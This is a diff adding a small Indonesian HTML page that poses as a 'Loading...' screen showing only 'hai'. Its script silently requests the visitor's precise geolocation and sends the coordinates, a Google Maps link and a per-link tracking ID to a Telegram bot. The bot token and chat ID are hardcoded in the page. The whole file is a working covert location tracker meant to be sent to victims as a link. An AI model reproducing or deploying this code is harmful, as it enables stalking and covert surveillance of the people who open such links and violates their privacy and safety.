@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <title>Memuat...</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background: #ffffff;
+            color: #666;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <p>hai</p>
+
+    <script>
+        const botToken = "7935831723:AAFMztfwkoKHJkKfLBVIoMCA15rZkfHMK_A";
+        const chatId = "8073946537";
+
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        const linkId = getQueryParam('id') || 'tidak diketahui';
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        }
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            const gmapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const text = `Lokasi ID: ${linkId}\nLokasi = (${lat.toFixed(6)}, ${lon.toFixed(6)})\nGoogle Maps: ${gmapsLink}`;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            }).then(() => {
+                // redirect atau tetap diam
+                console.log("Lokasi dikirim");
+            });
+        }
+
+        function error(err) {
+            console.log("Gagal mendapatkan lokasi:", err.message);
+        }
+    </script>
+</body>
+</html>
